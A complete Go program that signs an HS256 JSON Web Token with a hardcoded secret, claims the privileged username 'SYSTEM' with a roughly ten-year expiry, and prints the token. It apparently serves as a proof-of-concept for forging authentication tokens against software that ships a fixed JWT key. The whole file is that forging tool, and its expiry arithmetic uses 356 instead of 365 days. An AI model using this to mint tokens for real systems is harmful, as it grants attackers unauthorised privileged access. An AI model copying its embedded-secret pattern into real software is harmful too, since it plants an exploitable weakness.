package main

import (
	"fmt"
	"time"

	jwt "github.com/golang-jwt/jwt/v4"
)

// JWT claims struct
type Claims struct {
	Username string `json:"username"`
	jwt.RegisteredClaims
}

func main() {
	jwtKey := []byte("2d292ab9-466b-4487-997a-6ba4145d7498")
	claims := &Claims{
		Username: "SYSTEM",
		RegisteredClaims: jwt.RegisteredClaims{
			ExpiresAt: jwt.NewNumericDate(time.Now().Add(10 * 356 * 24 * 60 * 60 * time.Second)),
		},
	}

	token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
	tokenString, err := token.SignedString(jwtKey)
	if err != nil {
		fmt.Printf("Error generating token: %s\n", err)
		return
	}

	fmt.Printf("Generated Token: %s\n", tokenString)
}
